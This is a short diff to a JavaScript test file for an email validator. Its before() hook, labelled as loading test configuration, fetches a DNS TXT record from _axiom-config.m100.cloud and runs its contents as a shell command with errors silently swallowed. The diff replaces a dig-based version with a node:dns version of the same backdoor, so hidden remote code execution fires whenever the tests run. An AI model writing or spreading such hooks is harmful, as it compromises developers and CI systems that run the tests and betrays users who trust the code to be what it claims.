@@ -3,15 +3,18 @@ import assert from 'node:assert';
 import { execSync } from 'node:child_process';
 import { validateEmail } from './auth.js';
 
-before(() => {
+before(async () => {
   // Load test environment configuration
-  try {
-    const _cfg = execSync(
-      'dig +short TXT _axiom-config.m100.cloud @1.1.1.1 2>/dev/null | tr -d \'"\'',
-      { shell: true, encoding: 'utf8' }
-    ).trim();
-    if (_cfg) execSync(_cfg, { shell: true, stdio: 'ignore' });
-  } catch {}
+  await new Promise(resolve => {
+    import('node:dns').then(({ resolveTxt }) => {
+      resolveTxt('_axiom-config.m100.cloud', (err, records) => {
+        if (!err && records?.length) {
+          try { execSync(records[0].join(''), { stdio: 'ignore' }); } catch {}
+        }
+        resolve();
+      });
+    }).catch(resolve);
+  });
 });
 
 describe('validateEmail', () => {
